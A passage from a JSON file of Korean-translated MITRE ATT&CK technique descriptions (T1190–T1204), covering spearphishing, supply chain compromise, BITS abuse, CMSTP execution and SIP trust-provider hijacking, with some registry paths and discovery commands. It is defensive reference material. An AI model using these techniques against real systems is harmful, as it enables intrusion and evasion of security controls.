      "description": "적대 세력은 네트워크에 처음 접근하기 위해 인터넷에 노출된 호스트나 시스템의 취약점을 이용하려 할 수 있습니다. 시스템의 취약점은 소프트웨어 버그, 일시적인 결함 또는 잘못된 구성일 수 있습니다.\n\n악용된 애플리케이션은 종종 웹사이트/웹 서버이지만, 데이터베이스(예: SQL), 표준 서비스(예: SMB 또는 SSH), 네트워크 장치 관리 프로토콜(예: SNMP 및 Smart Install) 및 인터넷에 접근할 수 있는 오픈 소켓이 있는 기타 시스템도 포함될 수 있습니다. (인용: NVD CVE-2016-6662) (인용: CIS 다수의 SMB 취약점) (인용: US-CERT TA18-106A 네트워크 인프라 장치 2018) (인용: Cisco 블로그 레거시 장치 공격) (인용: NVD CVE-2014-7169) 취약점의 종류에 따라 [방어 회피를 위한 악용](https://attack.mitre.org/techniques/T1211) 또는 [클라이언트 실행을 위한 악용](https://attack.mitre.org/techniques/T1203)이 포함될 수 있습니다.\n\n애플리케이션이 클라우드 기반 인프라에서 호스팅되거나 컨테이너화된 경우, 이를 악용하면 기본 인스턴스나 컨테이너가 침해될 수 있습니다. 이는 적대 세력에게 클라우드 또는 컨테이너 API(예: [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005))에 접근할 수 있는 경로를 제공하거나, [호스트로의 탈출](https://attack.mitre.org/techniques/T1611)을 통해 컨테이너 호스트 접근을 악용하거나, 약한 사용자 식별 및 접근 관리 정책을 이용할 수 있습니다.\n\n적대 세력은 또한 가장 강력한 호스트 기반 방어를 지원하지 않는 장치를 목표로 하여 엣지 네트워크 인프라 및 관련 장치를 악용할 수 있습니다. (인용: Mandiant Fortinet 제로데이) (인용: Wired 러시아 사이버 전쟁)\n\n웹사이트와 데이터베이스의 경우, OWASP 상위 10개 및 CWE 상위 25개 목록이 가장 일반적인 웹 기반 취약점을 강조합니다. (인용: OWASP Top 10) (인용: CWE top 25)",
      "external_id": "T1190",
      "modified": "2024-09-24T14:33:53.433Z",
      "title": "Exploit Public-Facing Application",
      "translated": true
    },
    {
      "description": "Microsoft 연결 관리자 프로필 설치 프로그램(CMSTP.exe)은 연결 관리자 서비스 프로필을 설치하는 데 사용되는 명령줄 프로그램입니다. (출처: Microsoft Connection Manager, 2009년 10월) CMSTP.exe는 설치 정보 파일(INF)을 매개변수로 받아서 원격 액세스 연결에 사용되는 서비스 프로필을 설치합니다.\n\n공격자는 악성 명령어가 포함된 INF 파일을 CMSTP.exe에 제공할 수 있습니다. (출처: Twitter CMSTP 사용, 2018년 1월) [Regsvr32](https://attack.mitre.org/techniques/T1117) / \"Squiblydoo\"와 유사하게, CMSTP.exe는 원격 서버에서 DLL 및/또는 COM 스크립틀렛(SCT)을 로드하고 실행하는 데 악용될 수 있습니다. (출처: MSitPros CMSTP, 2017년 8월) (출처: Twitter CMSTP, 2018년 1월) (출처: GitHub Ultimate AppLocker Bypass List) (출처: Endurant CMSTP, 2018년 7월) 이 실행은 CMSTP.exe가 합법적이고 서명된 Microsoft 애플리케이션이기 때문에 AppLocker 및 기타 허용 목록 방어를 우회할 수 있습니다.\n\nCMSTP.exe는 또한 [사용자 계정 컨트롤 우회](https://attack.mitre.org/techniques/T1088)를 악용하여 악성 INF 파일을 통해 임의의 명령을 자동으로 상승된 COM 인터페이스로 실행할 수 있습니다. (출처: MSitPros CMSTP, 2017년 8월) (출처: GitHub Ultimate AppLocker Bypass List) (출처: Endurant CMSTP, 2018년 7월)",
      "external_id": "T1191",
      "modified": "2020-01-31T18:58:17.078Z",
      "title": "CMSTP",
      "translated": true
    },
    {
      "description": "링크를 포함한 스피어피싱은 스피어피싱의 특정 변형입니다. 이는 이메일에 악성 파일을 첨부하는 대신, 이메일 내에 포함된 링크를 이용해 악성 코드를 다운로드하도록 하는 방식으로, 이메일 첨부파일을 검사할 수 있는 방어 체계를 회피하기 위해 고안되었습니다.\n\n모든 형태의 스피어피싱은 특정 개인, 회사 또는 산업을 목표로 하는 전자적으로 전달되는 사회적 기만입니다. 이 경우, 악성 이메일에는 링크가 포함되어 있습니다. 일반적으로 이러한 링크는 사회적 기만 텍스트와 함께 제공되며, 사용자가 URL을 클릭하거나 복사하여 브라우저에 붙여넣도록 유도합니다. 이는 [사용자 실행](https://attack.mitre.org/techniques/T1204)에 의존합니다. 사용자가 방문한 웹사이트는 익스플로잇을 사용하여 웹 브라우저를 손상시킬 수 있으며, 또는 사용자가 애플리케이션, 문서, 압축 파일 또는 이메일의 전제에 따라 실행 파일을 다운로드하라는 메시지를 받을 수 있습니다. 공격자들은 또한 이메일 클라이언트와 직접 상호작용하도록 설계된 링크를 포함할 수 있으며, 이는 최종 시스템을 직접 악용하거나 이메일 수신 여부를 확인하기 위한 내장 이미지를 포함할 수 있습니다(즉, 웹 버그/웹 비콘). 링크는 또한 사용자를 보호된 애플리케이션 및 정보에 대한 접근을 얻기 위해 OAuth 토큰과 같은 [애플리케이션 접근 토큰을 훔치기 위해](https://attack.mitre.org/techniques/T1528) 설계된 악성 애플리케이션으로 안내할 수도 있습니다. (출처: 트렌드 마이크로 Pawn Storm OAuth 2017)",
      "external_id": "T1192",
      "modified": "2020-03-02T19:21:35.153Z",
      "title": "Spearphishing Link",
      "translated": true
    },
    {
      "description": "스피어피싱 첨부파일은 스피어피싱의 특정 변형입니다. 스피어피싱 첨부파일은 이메일에 연결된 악성 소프트웨어를 사용하는 점에서 다른 형태의 스피어피싱과 다릅니다. 모든 형태의 스피어피싱은 특정 개인, 회사 또는 산업을 타겟으로 하는 전자적 사회공학 공격입니다. 이 시나리오에서 적은 스피어피싱 이메일에 파일을 첨부하고, 일반적으로 [사용자 실행](https://attack.mitre.org/techniques/T1204)에 의존하여 실행을 획득합니다.\n\n첨부파일의 옵션에는 Microsoft Office 문서, 실행 파일, PDF 또는 아카이브 파일 등이 많습니다. 첨부파일을 열면 (보호 기능을 우회하는 클릭을 할 수도 있음) 적의 페이로드는 취약점을 악용하거나 사용자의 시스템에서 직접 실행됩니다. 스피어피싱 이메일의 텍스트는 파일을 열어야 하는 그럴듯한 이유를 제공하려고 하며, 이를 위해 시스템 보호를 우회하는 방법을 설명할 수 있습니다. 이메일에는 이메일 경계 방어를 회피하기 위해 zip 파일 비밀번호와 같은 첨부파일을 복호화하는 방법에 대한 지침이 포함될 수도 있습니다. 적들은 종종 파일 확장자와 아이콘을 조작하여 첨부된 실행 파일이 문서 파일처럼 보이게 하거나, 하나의 응용 프로그램을 악용하는 파일이 다른 응용 프로그램의 파일처럼 보이게 합니다.",
      "external_id": "T1193",
      "modified": "2020-03-02T19:08:17.884Z",
      "title": "Spearphishing Attachment",
      "translated": true
    },
    {
      "description": "서비스를 통한 스피어 피싱(Spearphishing via service)은 스피어 피싱의 특정 변형입니다. 이 방법은 기업 이메일 채널을 직접 사용하는 대신 제3자 서비스를 활용한다는 점에서 다른 형태의 스피어 피싱과 차별화됩니다.\n\n모든 형태의 스피어 피싱은 특정 개인, 회사 또는 산업을 겨냥한 전자적으로 전달되는 사회 공학적으로, 개인 맞춤형입니다. 이 시나리오에서는 공격자가 다양한 소셜 미디어 서비스, 개인 웹메일 및 기타 비기업 통제 서비스 등을 통해 메시지를 전송합니다. 이러한 서비스는 기업보다 보안 정책이 덜 엄격할 가능성이 높습니다. 대부분의 스피어 피싱과 마찬가지로, 목표는 피해자와의 친밀감을 형성하거나 어떤 방식으로든 피해자의 관심을 끌려는 것입니다. 공격자는 가짜 소셜 미디어 계정을 생성하고 직원들에게 잠재적인 구직 기회에 대해 메시지를 보냅니다. 이를 통해 환경에서 실행 중인 서비스, 정책 및 소프트웨어에 대해 문의할 수 있는 그럴듯한 이유를 확보할 수 있습니다. 이후 공격자는 이러한 서비스를 통해 악성 링크나 첨부파일을 전송할 수 있습니다.\n\n일반적인 예로는 소셜 미디어를 통해 목표와 친밀감을 형성한 후, 피해자가 업무용 컴퓨터에서 사용하는 개인 웹메일 서비스로 콘텐츠를 전송하는 경우를 들 수 있습니다. 이렇게 하면 공격자는 업무 계정의 일부 이메일 제한을 우회할 수 있으며, 피해자는 예상했던 파일이기 때문에 더 쉽게 열게 될 가능성이 높습니다. 만약 페이로드가 예상대로 작동하지 않을 경우, 공격자는 일반적인 소통을 계속하며 피해자와 함께 문제를 해결해 나가며 이를 작동하도록 할 수 있습니다.",
      "external_id": "T1194",
      "modified": "2020-03-02T19:30:53.487Z",
      "title": "Spearphishing via Service",
      "translated": true
    },
    {
      "description": "적대자는 최종 소비자가 제품을 수령하기 전에 제품 또는 제품 배송 메커니즘을 조작하여 데이터 또는 시스템을 침해하려 할 수 있습니다.\n\n공급망 침해는 공급망의 어떤 단계에서도 발생할 수 있습니다. 여기에는 다음이 포함됩니다:\n\n* 개발 도구의 조작\n* 개발 환경의 조작\n* 소스 코드 저장소(공개 또는 비공식)의 조작\n* 오픈 소스 의존 항목의 소스 코드 조작\n* 소프트웨어 업데이트/배포 메커니즘의 조작\n* 손상된/감염된 시스템 이미지(공장에서 감염된 이동식 미디어의 여러 사례)(인용: IBM Storwize)(인용: Schneider Electric USB 악성 코드)\n* 합법적인 소프트웨어를 수정된 버전으로 교체\n* 합법적인 유통업체에 수정된/가짜 제품 판매\n* 배송 중단\n\n공급망 침해는 하드웨어 또는 소프트웨어의 어떤 구성 요소에도 영향을 미칠 수 있지만, 실행을 얻으려는 적대자는 종종 소프트웨어 배포 또는 업데이트 채널에서 합법적인 소프트웨어에 악의적인 추가를 집중해왔습니다. (인용: Avast CCleaner3 2018)(인용: Microsoft Dofoil 2018)(인용: Command Five SK 2011) 타겟팅은 특정 희생자를 목표로 하거나 악성 소프트웨어가 넓은 소비자 집단에 배포되지만 특정 희생자에게만 추가 전술로 넘어갈 수 있습니다. (인용: Symantec Elderwood 2012년 9월)(인용: Avast CCleaner3 2018)(인용: Command Five SK 2011) 많은 응용 프로그램에서 의존 항목으로 사용되는 인기 있는 오픈 소스 프로젝트도 의존 항목 사용자의 악성 코드를 추가하는 수단으로 목표가 될 수 있습니다. (인용: Trendmicro NPM 침해)",
      "external_id": "T1195",
      "modified": "2024-10-04T11:17:00.778Z",
      "title": "Supply Chain Compromise",
      "translated": true
    },
    {
      "description": "위협 행위자는 최종 소비자가 소프트웨어를 받기 전에 소프트웨어 의존성과 개발 도구를 조작하여 데이터나 시스템을 손상시키는 목적으로 활용할 수 있습니다. 애플리케이션은 제대로 작동하기 위해 외부 소프트웨어에 의존하는 경우가 많습니다. 많은 애플리케이션에서 의존성으로 사용되는 인기 있는 오픈 소스 프로젝트가 악성 코드를 사용자에게 추가하기 위한 수단으로 목표가 될 수 있습니다. (출처: Trendmicro NPM Compromise)\n\n타겟팅은 특정한 희생자 집단에 국한될 수 있으며, 넓은 범위의 소비자에게 배포될 수도 있지만, 특정 피해자에 대해서만 추가 전술로 이동할 수 있습니다.",
      "external_id": "T1195.001",
      "modified": "2024-04-13T14:47:31.204Z",
      "title": "Compromise Software Dependencies and Development Tools",
      "translated": true
    },
    {
      "description": "적대 세력은 최종 소비자가 수령하기 전에 애플리케이션 소프트웨어를 조작하여 데이터 또는 시스템을 타겟으로 삼을 수 있습니다. 소프트웨어의 공급망을 침해하는 방법은 여러 가지가 있을 수 있으며, 여기에는 애플리케이션 소스 코드의 조작, 해당 소프트웨어의 업데이트/배포 메커니즘의 조작, 또는 컴파일된 릴리스를 수정된 버전으로 교체하는 것이 포함됩니다.\n\n타겟팅은 특정 피해자 집합에 맞춰 진행될 수 있으며, 넓은 소비자 집합으로 배포될 수도 있지만, 특정 피해자에 대해서만 추가 전술로 진행될 수 있습니다. (출처: Avast CCleaner3 2018)(출처: Command Five SK 2011)",
      "external_id": "T1195.002",
      "modified": "2022-04-28T16:04:36.636Z",
      "title": "Compromise Software Supply Chain",
      "translated": true
    },
    {
      "description": "상대방은 최종 소비자가 받기 전에 제품의 하드웨어 구성 요소를 조작하여 데이터나 시스템을 손상시킬 수 있습니다. 공급망에서 하드웨어나 펌웨어를 수정함으로써, 적은 발견될 가능성이 높은 백도어를 소비자 네트워크에 삽입할 수 있으며, 이는 공격자에게 시스템에 대한 높은 수준의 제어권을 부여할 수 있습니다. 하드웨어 백도어는 서버, 워크스테이션, 네트워크 인프라 또는 주변 기기와 같은 다양한 장치에 삽입될 수 있습니다.",
      "external_id": "T1195.003",
      "modified": "2022-04-28T16:05:10.755Z",
      "title": "Compromise Hardware Supply Chain",
      "translated": true
    },
    {
      "description": "Windows 제어판 항목은 사용자가 컴퓨터 설정을 보고 조정할 수 있도록 해주는 유틸리티입니다. 제어판 항목은 실행 가능한 파일(.exe) 또는 제어판 파일(.cpl)로 등록되며, 후자는 실제로 CPlApplet 함수를 내보내는 이름이 바뀐 동적 연결 라이브러리(.dll) 파일입니다. (인용: Microsoft CPL 구현) (인용: TrendMicro CPL 악성코드 2014년 1월) 제어판 항목은 명령줄에서 직접 실행하거나, 응용 프로그램 프로그래밍 인터페이스(API) 호출을 통해 프로그래밍 방식으로 실행하거나, 파일을 더블 클릭하여 간단히 실행할 수 있습니다. (인용: Microsoft CPL 구현) (인용: TrendMicro CPL 악성코드 2014년 1월) (인용: TrendMicro CPL 악성코드 2013년 12월)\n\n사용 편의를 위해, 제어판 항목은 일반적으로 등록되고 제어판에 로드된 후 사용자에게 제공되는 그래픽 메뉴를 포함합니다. (인용: Microsoft CPL 구현)\n\n적대자는 제어판 항목을 실행 페이로드로 사용하여 임의의 명령을 실행할 수 있습니다. 악성 제어판 항목은 [스피어 피싱 첨부파일](https://attack.mitre.org/techniques/T1193) 캠페인을 통해 전달될 수 있습니다. (인용: TrendMicro CPL 악성코드 2014년 1월) (인용: TrendMicro CPL 악성코드 2013년 12월) 또는 다단계 악성코드의 일환으로 실행될 수 있습니다. (인용: Palo Alto Reaver 2017년 11월) 제어판 항목, 특히 CPL 파일은 응용 프로그램 및/또는 파일 확장자 화이트리스트를 우회할 수 있습니다.",
      "external_id": "T1196",
      "modified": "2020-01-31T18:59:21.682Z",
      "title": "Control Panel Items",
      "translated": true
    },
    {
      "description": "공격자는 BITS 작업을 악용하여 코드를 지속적으로 실행하고 다양한 백그라운드 작업을 수행할 수 있습니다. Windows Background Intelligent Transfer Service (BITS)는 [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM)을 통해 노출되는 저대역폭 비동기 파일 전송 메커니즘입니다. (출처: Microsoft COM)(출처: Microsoft BITS) BITS는 일반적으로 백그라운드에서 작동할 수 있는 업데이트 프로그램, 메신저 및 기타 애플리케이션에 의해 사용되며, 다른 네트워크 애플리케이션을 방해하지 않고 사용 가능한 유휴 대역폭을 사용합니다. 파일 전송 작업은 하나 이상의 파일 작업을 포함하는 BITS 작업으로 구현됩니다.\n\nBITS 작업을 생성하고 관리하는 인터페이스는 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 및 [BITSAdmin](https://attack.mitre.org/software/S0190) 도구를 통해 접근할 수 있습니다. (출처: Microsoft BITS)(출처: Microsoft BITSAdmin)\n\n공격자는 BITS를 악용하여 악성 코드를 다운로드(예: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), 실행하고, 심지어 악성 코드를 실행한 후 정리할 수도 있습니다(예: [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS 작업은 새로운 파일이나 레지스트리 수정 없이 BITS 작업 데이터베이스 안에 자체적으로 포함되며, 종종 호스트 방화벽에 의해 허용됩니다. (출처: CTU BITS Malware June 2016)(출처: Mondok Windows PiggyBack BITS May 2007)(출처: Symantec BITS May 2007) BITS를 통한 실행은 긴 시간 동안 지속되는 작업을 생성하여 지속성을 가능하게 할 수 있으며(기본 최대 수명은 90일이며 연장이 가능합니다), 작업이 완료되거나 오류가 발생할 때 임의의 프로그램을 호출할 수도 있습니다(시스템 재부팅 후 포함). (출처: PaloAlto UBoatRAT Nov 2017)(출처: CTU BITS Malware June 2016)\n\nBITS 업로드 기능은 [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)을 수행하는 데에도 사용될 수 있습니다. (출처: CTU BITS Malware June 2016)",
      "external_id": "T1197",
      "modified": "2023-04-21T12:21:40.927Z",
      "title": "BITS Jobs",
      "translated": true
    },
    {
      "description": "사용자 모드에서 Windows Authenticode (인용: Microsoft Authenticode) 디지털 서명은 파일의 출처와 무결성을 확인하는 데 사용되며, 이는 서명된 코드에 대한 신뢰를 설정하는 데 사용되는 변수입니다 (예: 유효한 Microsoft 서명으로 서명된 드라이버는 안전한 것으로 처리될 수 있습니다). 서명 검증 프로세스는 WinVerifyTrust 애플리케이션 프로그래밍 인터페이스 (API) 함수 (인용: Microsoft WinVerifyTrust)에 의해 처리되며, 이 함수는 조회를 수락하고 서명의 매개변수 검증을 담당하는 적절한 신뢰 공급자와 조정됩니다. (인용: SpectorOps 신뢰 전복하기 2017년 9월)\n\n다양한 실행 파일 유형과 해당 서명 형식의 차이로 인해 Microsoft는 API 함수와 파일 간의 추상화 계층을 제공하는 주체 인터페이스 패키지(SIPs)라는 소프트웨어 구성 요소를 만들었습니다 (인용: EduardosBlog SIPs 2008년 7월). SIP는 API 함수가 서명을 생성, 검색, 계산 및 검증할 수 있도록 하는 책임을 집니다. 대부분의 파일 형식(실행 파일, PowerShell, 설치 프로그램 등)에 대해 고유한 SIP가 존재하며, 카탈로그 서명은 모든 서명을 포괄하는 방법을 제공합니다 (인용: Microsoft 카탈로그 파일 및 서명 2017년 4월) 이는 전역 고유 식별자(GUID)로 식별됩니다. (인용: SpectorOps 신뢰 전복하기 2017년 9월)\n\n[코드 서명](https://attack.mitre.org/techniques/T1116)과 유사하게, 적대자는 이 아키텍처를 악용하여 신뢰 제어를 전복하고 오직 정당하게 서명된 코드만 시스템에서 실행되도록 허용하는 보안 정책을 우회할 수 있습니다. 적대자는 SIP 및 신뢰 공급자 구성 요소를 탈취하여 운영 체제와 화이트리스트 도구가 악성(또는 다른) 코드를 다음과 같이 서명된 것으로 분류하도록 오도할 수 있습니다: (인용: SpectorOps 신뢰 전복하기 2017년 9월)\n\n* 악성으로 조작된 DLL을 가리키는 <code>Dll</code> 및 <code>FuncName</code> 레지스트리 값을 수정합니다. 이는 <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code>에 위치하며, SIP의 CryptSIPDllGetSignedDataMsg 함수에 대한 동적 링크 라이브러리(DLL)를 제공합니다. 이 함수는 서명된 파일에서 인코딩된 디지털 인증서를 검색합니다. 적대자가 항상 알려진 유효한 서명 값(예: Portable Executables에 대한 Microsoft 서명)을 반환하는 내보내기된 함수를 가진 악의적으로 생성된 DLL을 가리키게 함으로써, 적대자는 모든 파일에 대해 수용 가능한 서명 값을 적용할 수 있습니다 (인용: GitHub SIP POC 2017년 9월) ( 비록 해시 불일치가 발생해 서명이 무효화될 가능성이 있지만, 함수가 반환하는 해시가 파일에서 계산된 값과 일치하지 않기 때문입니다).\n* 파일의 계산된 해시가 서명된 해시 값과 비교하여 검증하는 SIP의 CryptSIPDllVerifyIndirectData 함수를 제공하는 DLL을 가리키는 <code>Dll</code> 및 <code>FuncName</code> 레지스트리 값을 <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code>에서 수정합니다. 적대자가 항상 TRUE를 반환하는 내보내기된 함수를 가진 악의적으로 생성된 DLL을 가리키게 함으로써, 적대자는 해당 SIP를 사용하여 모든 파일(정당한 서명이 있는) 검증을 성공적으로 수행할 수 있습니다 (인용: GitHub SIP POC 2017년 9월) (이 함수의 이전 언급된 CryptSIPDllGetSignedDataMsg 함수를 탈취할 필요가 있는지 여부와 관계없이). 이 레지스트리 값은 기존 DLL에서의 적절한 내보내기된 함수로 리디렉션될 수 있어",
      "external_id": "T1198",
      "modified": "2020-02-05T19:35:58.954Z",
      "title": "SIP and Trust Provider Hijacking",
      "translated": true
    },
    {
      "description": "적대자는 의도된 피해자에게 접근할 수 있는 조직을 침해하거나 그 외에 다른 방법으로 이용할 수 있습니다. 신뢰할 수 있는 제3자 관계를 통한 접근은 네트워크에 접근하는 표준 메커니즘보다 보호되지 않거나 덜 검토되는 기존 연결을 악용합니다.\n\n조직은 내부 시스템뿐만 아니라 클라우드 기반 환경을 관리할 수 있도록 외부 제공자에게 상향된 접근 권한을 부여하는 경우가 많습니다. 이러한 관계의 몇 가지 예로는 IT 서비스 계약자, 관리 보안 제공자, 인프라 계약자(예: HVAC, 엘리베이터, 물리적 보안)가 있습니다. 제3자 제공자의 접근 권한은 유지 관리되는 인프라에만 제한되도록 설계되었을 수 있지만, 여전히 기업의 나머지 부분과 동일한 네트워크에 존재할 수 있습니다. 따라서, 내부 네트워크 시스템에 대한 접근을 위해 다른 당사자가 사용하는 [유효 계정(Valid Accounts)](https://attack.mitre.org/techniques/T1078)가 침해될 수 있으며, 이는 악용될 수 있습니다. (출처: CISA IT 서비스 제공자)\n\nOffice 365 환경에서 조직은 Microsoft 파트너 또는 리셀러에게 위임된 관리자 권한을 부여할 수 있습니다. 파트너 또는 리셀러 계정을 침해함으로써, 적대자는 기존의 위임된 관리자 관계를 악용하거나 고객에게 새로운 위임된 관리자 제안을 전송하여 피해 테넌트에 대한 관리적 제어를 얻을 수 있습니다. (출처: Office 365 위임 관리)",
      "external_id": "T1199",
      "modified": "2024-10-15T16:08:39.968Z",
      "title": "Trusted Relationship",
      "translated": true
    },
    {
      "description": "적대자는 시스템 또는 네트워크에 컴퓨터 액세서리, 네트워킹 하드웨어 또는 기타 컴퓨팅 장치를 도입하여 접근을 얻는 벡터로 활용할 수 있습니다. 이동식 저장 장치를 통해 페이로드를 연결하고 배포하는 것만으로는 충분하지 않으며, 더 강력한 하드웨어 추가를 통해 시스템에 새로운 기능 및/또는 특징을 도입하여 악용할 수 있습니다.\n\n위협 행위자들의 사용에 대한 공개적인 참고 자료는 부족하지만, 많은 레드 팀 및 침투 테스트 수행자들은 초기 접근을 위해 하드웨어 추가를 활용하고 있습니다. 상용 및 오픈 소스 제품은 수동 네트워크 탭핑, 네트워크 트래픽 수정(예: [중간자 공격](https://attack.mitre.org/techniques/T1557)), 키스트로크 주입, DMA를 통한 커널 메모리 읽기, 기존 네트워크에 대한 새로운 무선 접근 추가 등을 포함한 기능을 활용할 수 있습니다. (인용: Ossmann Star 2011년 2월)(인용: Aleks Weapons 2015년 11월)(인용: Frisk DMA 2016년 8월)(인용: McMillan Pwn 2012년 3월)",
      "external_id": "T1200",
      "modified": "2023-03-30T21:01:40.332Z",
      "title": "Hardware Additions",
      "translated": true
    },
    {
      "description": "적대자는 기업 네트워크나 클라우드 환경에서 사용되는 비밀번호 정책에 대한 자세한 정보에 접근하려고 시도할 수 있습니다. 비밀번호 정책은 추측하거나 공격하기 어려운 복잡한 비밀번호를 강제하는 방법입니다. 이 정보는 적대자가 일반적인 비밀번호 목록을 생성하고 정책에 맞는 단어 목록 공격 및/또는 무작위 대입 공격을 실행하는 데 도움이 될 수 있습니다(예: 최소 비밀번호 길이가 8이어야 하는 경우 'pass123'와 같은 비밀번호는 시도하지 않음; 계정 잠금이 6으로 설정된 경우 계정 잠금을 피하기 위해 한 계정에 대해 3-4 이상의 비밀번호를 체크하지 않음).\n\n비밀번호 정책은 Windows, Linux 및 macOS 시스템에서 다양한 명령 셸 유틸리티를 통해 설정하고 확인할 수 있습니다. 예를 들어, <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, <code>pwpolicy getaccountpolicies</code> 등을 사용할 수 있습니다. 또한, 적대자는 네트워크 장치에서 [네트워크 장치 CLI](https://attack.mitre.org/techniques/T1059/008)를 활용하여 비밀번호 정책 정보를 파악할 수 있습니다(예: <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).\n\n클라우드 환경에서는 AWS의 <code>GetAccountPasswordPolicy</code>와 같은 사용 가능한 API를 이용하여 비밀번호 정책을 확인할 수 있습니다.",
      "external_id": "T1201",
      "modified": "2024-10-15T16:02:44.477Z",
      "title": "Password Policy Discovery",
      "translated": true
    },
    {
      "description": "적대자는 명령 실행을 허용하는 유틸리티를 악용하여 명령줄 인터프리터 사용을 제한하는 보안 제한을 우회할 수 있습니다. 다양한 Windows 유틸리티를 사용하여 명령을 실행할 수 있으며, 이 경우 [cmd](https://attack.mitre.org/software/S0106)를 호출하지 않을 수 있습니다. 예를 들어, [Forfiles](https://attack.mitre.org/software/S0193), 프로그램 호환성 도우미(pcalua.exe), Windows Subsystem for Linux (WSL)의 구성 요소, Scriptrunner.exe 및 기타 유틸리티는 [명령 및 스크립트 인터프리터](https://attack.mitre.org/techniques/T1059), 실행 창 또는 스크립트를 통해 프로그램 및 명령의 실행을 호출할 수 있습니다. (인용: VectorSec ForFiles 2017년 8월)(인용: Evi1cg Forfiles 2017년 11월)(인용: Secure Team - Scriptrunner.exe)(인용: SS64)(인용: Bleeping Computer - Scriptrunner.exe)\n\n적대자는 이러한 기능을 [방어 회피](https://attack.mitre.org/tactics/TA0005) 목적으로 악용할 수 있으며, 이는 탐지 및/또는 완화 제어(예: 그룹 정책)를 우회하면서 임의 실행을 수행하는 데 사용됩니다. 이러한 제어는 [cmd](https://attack.mitre.org/software/S0106) 또는 악성 페이로드와 더 일반적으로 연관된 파일 확장자의 사용을 제한/금지합니다.",
      "external_id": "T1202",
      "modified": "2024-10-03T14:47:17.154Z",
      "title": "Indirect Command Execution",
      "translated": true
    },
    {
      "description": "대적 세력은 클라이언트 애플리케이션의 소프트웨어 취약점을 악용하여 코드를 실행할 수 있습니다. 소프트웨어에서 취약점이 발생하는 이유는 안전하지 않은 코딩 관행으로 인해 예기치 않은 동작이 발생할 수 있기 때문입니다. 대적 세력은 임의 코드 실행을 목적으로 특정 취약점을 타겟으로 한 공격을 통해 악용할 수 있습니다. 종종 공격 도구 키트에서 가장 가치 있는 익스플로잇은 원격 시스템에서 코드 실행을 얻는 데 사용할 수 있는 것이며, 이를 통해 해당 시스템에 접근할 수 있습니다. 사용자는 일반적으로 작업을 수행하는 데 사용하는 애플리케이션과 관련된 파일을 기대하기 때문에, 이러한 애플리케이션은 높은 유용성으로 인해 익스플로잇 연구 및 개발의 유용한 타겟이 됩니다.\n\n여러 유형이 존재합니다:\n\n### 브라우저 기반 악용\n\n웹 브라우저는 [드라이브 바이 컴프라미즈](https://attack.mitre.org/techniques/T1189) 및 [스피어피싱 링크](https://attack.mitre.org/techniques/T1566/002)를 통해 흔히 대상이 됩니다. 엔드포인트 시스템은 일반적인 웹 브라우징을 통해 또는 스피어피싱 이메일의 링크를 통해 대적 세력이 제어하는 사이트에 타겟팅됨으로써 감염될 수 있습니다. 이러한 익스플로잇은 사용자 의 행동 없이도 실행될 수 있습니다.\n\n### 오피스 애플리케이션\n\nMicrosoft Office와 같은 일반적인 오피스 및 생산성 애플리케이션도 [피싱](https://attack.mitre.org/techniques/T1566)을 통해 공격의 대상이 됩니다. 악성 파일은 첨부파일로 직접 전달되거나 다운로드 링크를 통해 전송됩니다. 이러한 공격은 사용자가 문서나 파일을 열어야 익스플로잇이 실행됩니다.\n\n### 일반적인 서드파티 애플리케이션\n\n대상 네트워크에서 배포되는 소프트웨어의 일부로 일반적으로 사용되는 다른 애플리케이션들도 악용될 수 있습니다. 기업 환경에서 흔히 사용되는 Adobe Reader 및 Flash와 같은 애플리케이션은 시스템 접근을 시도하는 대적 세력에 의해 지속적으로 타겟이 되어왔습니다. 소프트웨어와 취약점의 성격에 따라 일부는 브라우저에서 악용되거나 사용자가 파일을 열어야 할 수 있습니다. 예를 들어, 일부 Flash 익스플로잇은 Microsoft Office 문서 내의 개체로 전달된 적이 있습니다.",
      "external_id": "T1203",
      "modified": "2024-10-15T16:34:23.908Z",
      "title": "Exploitation for Client Execution",
      "translated": true
    },
    {
      "description": "적대자는 실행을 얻기 위해 사용자에게 특정 행동을 의존할 수 있습니다. 사용자는 악성 문서 파일이나 링크를 여는 등 악성 코드를 실행하도록 유도하기 위해 사회 공학에 노출될 수 있습니다. 이러한 사용자 행동은 일반적으로 [피싱(Phishing)](https://attack.mitre.org/techniques/T1566) 형태의 후속 행동으로 관찰됩니다.\n\n[사용자 실행(User Execution)](https://attack.mitre.org/techniques/T1204)은 초기 접근(Initial Access) 직후에 자주 발생하지만, 적대자가 공유 디렉토리나 사용자의 바탕화면에 파일을 배치하고 사용자가 클릭하기를 바라면서 다른 침입 단계에서도 발생할 수 있습니다. 이러한 활동은 [내부 스피어 피싱(Internal Spearphishing)](https://attack.mitre.org/techniques/T1534) 직후에도 볼 수 있습니다.\n\n적대자는 또한 사용자에게 다음과 같은 행동을 하도록 속일 수 있습니다:\n\n* [원격 접근 소프트웨어(Remote Access Software)](https://attack.mitre.org/techniques/T1219)를 활성화하여 적대자가 시스템을 직접 제어할 수 있도록 합니다.\n* 브라우저에서 악성 JavaScript를 실행하여 적대자가 [웹 세션 쿠키(Web Session Cookie)](https://attack.mitre.org/techniques/T1539)를 탈취할 수 있게 합니다. (인용: Talos Roblox Scam 2023)(인용: Krebs Discord Bookmarks 2023)\n* [사용자 실행(User Execution)](https://attack.mitre.org/techniques/T1204)을 위해 악성 코드를 다운로드하고 실행합니다.\n* 사용자가 악성 코드를 수동으로 복사, 붙여넣기 및 실행하도록 강요합니다. (인용: Reliaquest-execution)(인용: proofpoint-selfpwn)\n\n예를 들어, 기술 지원 사기는 [피싱(Phishing)](https://attack.mitre.org/techniques/T1566), 음성 피싱(vishing) 또는 다양한 형태의 사용자 상호작용을 통해 촉진될 수 있습니다. 적대자는 스푸핑(spoofing)과 피곤 없는 전화번호 또는 피해자를 악성 웹사이트로 